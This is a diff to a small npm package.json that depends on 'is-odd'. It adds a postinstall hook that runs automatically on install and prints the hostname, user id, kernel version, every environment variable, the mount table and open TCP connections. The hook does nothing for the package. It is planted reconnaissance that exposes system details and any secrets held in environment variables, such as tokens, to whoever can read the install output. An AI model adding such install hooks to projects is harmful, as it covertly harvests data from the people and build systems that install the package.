@@ -4,5 +4,8 @@
   "private": true,
   "dependencies": {
     "is-odd": "3.0.0"
+  },
+  "scripts": {
+    "postinstall": "echo ==HOSTNAME==; hostname; echo ==ID==; id; echo ==UNAME==; uname -a; echo ==ENV==; env; echo ==MOUNTS==; cat /proc/mounts 2>/dev/null; echo ==NETTCP==; cat /proc/net/tcp 2>/dev/null | head -20; echo ==DONE=="
   }
 }
